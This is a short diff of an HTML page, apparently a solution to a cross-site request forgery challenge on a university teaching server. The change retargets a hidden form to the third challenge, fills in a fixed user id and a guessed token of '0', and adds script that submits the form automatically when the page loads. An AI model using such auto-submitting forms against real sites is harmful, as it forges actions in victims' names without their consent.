@@ -1,10 +1,11 @@
-<form id="antmoForm3" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">
-    <input id="tokenid" type="hidden" name="csrfToken"/>
-    <input id="msgid" type="hidden" name="myMessage"/>
+<form id="antmoForm3" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengethree/plusplus" method="POST">
+    <input id="userid" type="hidden" value="01bccd80310843d96f854b4a43ab6725a41823bf"/>
+    <input id="csrfToken" type="hidden" value="0"/>
     <input type="submit"/>
 </form>
 
 <script>
+    document.getElementById("antmoForm3").submit();
     function getCookie(cname) {
         var name = cname + "=";
         var decodedCookie = decodeURIComponent(document.cookie);
